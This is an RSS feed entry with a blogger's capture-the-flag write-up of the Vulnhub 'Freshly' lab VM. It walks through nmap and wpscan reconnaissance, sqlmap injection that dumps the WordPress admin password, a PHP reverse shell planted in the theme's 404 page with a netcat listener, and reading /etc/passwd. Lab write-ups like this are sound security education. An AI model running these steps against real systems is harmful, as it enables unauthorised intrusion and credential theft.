<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Websec on Unlogic</title>
    <link>https://svenito.github.io/nowhere/tags/websec/</link>
    <description>Recent content in Websec on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 11 Apr 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://svenito.github.io/nowhere/tags/websec/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>